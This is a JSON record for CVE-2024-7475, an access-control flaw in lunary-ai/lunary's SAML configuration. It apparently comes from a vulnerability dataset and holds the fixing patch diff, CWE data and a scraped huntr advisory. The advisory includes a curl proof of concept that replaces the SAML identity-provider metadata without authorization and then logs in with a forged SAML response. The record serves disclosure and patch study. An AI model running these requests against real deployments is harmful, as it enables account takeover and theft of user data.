{
    "CVE-2024-7475": {
        "published_date": "2024-10-29T12:45:53.136Z",
        "patch_commits": [
            {
                "url": "https://github.com/lunary-ai/lunary/commit/8f563c77d8614a72980113f530c7a9ec15a5f8d5",
                "content": "fix: vulnerabilities (#468)\n\nFilename: packages/backend/src/api/v1/datasets/index.ts:\n```\n@@ -107,8 +107,15 @@\ndatasets.patch(\n     }\n \n     const [dataset] = await sql`\n-    update dataset set slug = ${slug} where id = ${id} and project_id = ${projectId} returning *\n-  `\n+      update \n+        dataset \n+      set \n+        slug = ${slug} \n+      where \n+      id = ${id} \n+      and project_id = ${projectId} \n+      returning *\n+    `\n \n     ctx.body = dataset\n   },\n\n@@ -218,10 +225,25 @@\ndatasets.patch(\n   checkAccess(\"datasets\", \"update\"),\n   async (ctx: Context) => {\n     const { id } = ctx.params\n+    const { projectId } = ctx.state\n     const { messages } = ctx.request.body as {\n       messages: string\n     }\n \n+    const [dataset] = await sql`\n+      select \n+        d.id \n+      from \n+        dataset_prompt dp\n+        left join dataset d on dp.dataset_id = d.id\n+      where\n+        d.project_id = ${projectId}\n+    `\n+\n+    if (!dataset) {\n+      ctx.throw(403, \"Unauthorized\")\n+    }\n+\n     const [prompt] =\n       await sql`update dataset_prompt set messages = ${messages} where id = ${id} returning *`\n```\n\nFilename: packages/backend/src/api/v1/external-users.ts:\n```\n@@ -141,17 +141,32 @@\nusers.get(\"/runs/usage\", checkAccess(\"users\", \"read\"), async (ctx) => {\n \n users.get(\"/:id\", checkAccess(\"users\", \"read\"), async (ctx: Context) => {\n   const { id } = ctx.params\n+  const { projectId } = ctx.state\n+\n   const [row] = await sql`\n-    select * from external_user where id = ${id} limit 1\n+    select \n+      * \n+    from \n+      external_user \n+    where \n+      id = ${id} \n+      and project_id = ${projectId}\n   `\n \n   ctx.body = row\n })\n \n users.delete(\"/:id\", checkAccess(\"users\", \"delete\"), async (ctx: Context) => {\n   const { id } = ctx.params\n+  const { projectId } = ctx.state\n \n-  await sql`delete from external_user where id = ${id}`\n+  await sql`\n+    delete \n+    from external_user \n+    where \n+      id = ${id}\n+      and project_id = ${projectId}\n+    `\n \n   ctx.status = 204\n })\n```\n\nFilename: packages/backend/src/api/v1/templates.ts:\n```\n@@ -4,6 +4,7 @@\nimport { clearUndefined } from \"@/src/utils/ingest\"\n import Context from \"@/src/utils/koa\"\n import { unCamelObject } from \"@/src/utils/misc\"\n import Router from \"koa-router\"\n+import { z } from \"zod\"\n \n const templates = new Router({\n   prefix: \"/templates\",\n\n@@ -167,26 +168,44 @@\ntemplates.post(\n   \"/:id/versions\",\n   checkAccess(\"prompts\", \"update\"),\n   async (ctx: Context) => {\n-    const { content, extra, testValues, isDraft, notes } = ctx.request.body as {\n-      content: any[]\n-      extra: any\n-      testValues: any\n-      isDraft: boolean\n-      notes: string\n+    const paramsSchema = z.object({\n+      id: z.coerce.number(),\n+    })\n+    const bodySchema = z.object({\n+      content: z.array(z.any()),\n+      extra: z.any(),\n+      testValues: z.any(),\n+      isDraft: z.boolean(),\n+      notes: z.string().optional().nullable(),\n+    })\n+\n+    const { projectId } = ctx.state\n+    const { content, extra, testValues, isDraft, notes } = bodySchema.parse(\n+      ctx.request.body,\n+    )\n+    const { id: templateId } = paramsSchema.parse(ctx.params)\n+\n+    const [template] =\n+      await sql`select id from template where id = ${templateId} and project_id = ${projectId}\n+    `\n+\n+    if (!template) {\n+      ctx.throw(403, \"Unauthorized\")\n     }\n \n     const [templateVersion] = await sql`\n-    insert into template_version ${sql(\n-      clearUndefined({\n-        templateId: ctx.params.id,\n-        content: sql.json(content),\n-        extra: sql.json(unCamelObject(extra)),\n-        test_values: sql.json(testValues),\n-        isDraft,\n-        notes,\n-      }),\n-    )} returning *\n-  `\n+      insert into template_version ${sql(\n+        clearUndefined({\n+          templateId: ctx.params.id,\n+          content: sql.json(content),\n+          extra: sql.json(unCamelObject(extra)),\n+          test_values: sql.json(testValues),\n+          isDraft,\n+          notes,\n+        }),\n+      )} \n+      returning *\n+    `\n \n     ctx.body = templateVersion\n   },\n```"
            }
        ],
        "sw_version": "v1.3.4-alpha.1",
        "sw_version_wget": "https://github.com/lunary-ai/lunary/archive/refs/tags/v1.3.4-alpha.1.zip",
        "description": "An improper access control vulnerability in lunary-ai/lunary version 1.3.2 allows an attacker to update the SAML configuration without authorization. This vulnerability can lead to manipulation of authentication processes, fraudulent login requests, and theft of user information. Appropriate access controls should be implemented to ensure that the SAML configuration can only be updated by authorized users.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/78c824f7-3b6d-443d-bb76-0f8031c6c126",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nImproper Access Control on SAML Configuration in lunary-ai/lunary\nValid\nReported on Jun 29th 2024\nDescription\nThis vulnerability allows an attacker to update the SAML configuration without authorization. This type of vulnerability can lead to serious consequences, as changing the SAML configuration can lead to manipulation of authentication processes, fraudulent login requests, and theft of user information. Therefore, appropriate access controls should be implemented to ensure that the SAML configuration can only be updated by authorized users.\nProof of Concept\n# Update saml configuration\ncurl http://localhost:3333/auth/saml/<org_id>/download-idp-xml -X POST -d '<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><md%3aEntityDescriptor+xmlns%3amd%3d\"urn%3aoasis%3anames%3atc%3aSAML%3a2.0%3ametadata\"+entityID%3d\"<service>\"><md%3aIDPSSODescriptor+WantAuthnRequestsSigned%3d\"false\"+protocolSupportEnumeration%3d\"urn%3aoasis%3anames%3atc%3aSAML%3a2.0%3aprotocol\"><md%3aSingleLogoutService+Binding%3d\"urn%3aoasis%3anames%3atc%3aSAML%3a2.0%3abindings%3aHTTP-POST\"+Location%3d\"<logout_service>\"/><md%3aSingleLogoutService+Binding%3d\"urn%3aoasis%3anames%3atc%3aSAML%3a2.0%3abindings%3aHTTP-Redirect\"+Location%3d\"<logout_service>\"/><md%3aNameIDFormat>urn%3aoasis%3anames%3atc%3aSAML%3a1.1%3anameid-format%3aemailAddress</md%3aNameIDFormat><md%3aSingleSignOnService+Binding%3d\"urn%3aoasis%3anames%3atc%3aSAML%3a2.0%3abindings%3aHTTP-POST\"+Location%3d\"<login_service>\"/><md%3aSingleSignOnService+Binding%3d\"urn%3aoasis%3anames%3atc%3aSAML%3a2.0%3abindings%3aHTTP-Redirect\"+Location%3d\"<login_service>\"/></md%3aIDPSSODescriptor></md%3aEntityDescriptor>'\n\n# This request will return a redirect url, log in with this url.\ncurl http://localhost:3333/auth/method -X POST -d \"email=test@foo.bar\" \n\n# Log in by adding Saml response data to the request\ncurl \"http://localhost:3333/auth/saml/<org_id>/acs\" -X POST -d 'SAMLResponse=<data>' \nImpact\nAn attacker can gain access to unauthorized users by creating fake SAML requests.\nOccurrences\nsaml.ts L145-L190\nWe are processing your report and will contact thelunary-ai/lunary team within 24 hours.a year ago\nhuntr-helpermodified the Severity from Critical (9.8) to Critical (9.1)a year ago\nWe have contacted a member of thelunary-ai/lunary team and are waiting to hear backa year ago\nWe have sent a follow up to the lunary-ai/lunary team. We will try again in 4 days.10 months ago\nWe have sent a second follow up to the lunary-ai/lunary team. We will try again in 7 days.10 months ago\nWe have sent a third follow up to the lunary-ai/lunary team. We will try again in 14 days.10 months ago\nWe have sent a fourth follow up to the lunary-ai/lunary team. We will send a final notification 48 hours before report publication.10 months ago\nThis report has now been passed to internal triage and should be resolved within 14 days.10 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nHugues Chocart validated this vulnerability9 months ago\nmvlttthas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-7475assigned to this report.9 months ago\nHugues Chocartmarked this as fixedin 1.3.4with commit8f563c9 months ago\nHugues Chocarthas been awarded the fix bounty\nsaml.ts#L145-L190 has been validated\nWe have notified the lunary-ai/lunary maintainers about this report in their weekly follow-up8 months ago\nWe have sent a warning to the lunary-ai/lunary team to inform them that this report will be published in 48 hours8 months ago\nThis vulnerability has now been published8 months ago\nSign in to join this conversation\nCVE\nCVE-2024-7475\n(Published)\nVulnerability Type\nCWE-284: Improper Access Control\nSeverity\nCritical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\n1.3.2\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$900\nFix Bounty\n$225\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The security advisory provides a proof of concept through specific technical steps and exact command examples."
            }
        ],
        "cwe": [
            {
                "id": "CWE-284",
                "value": "CWE-284 Improper Access Control"
            }
        ]
    }
}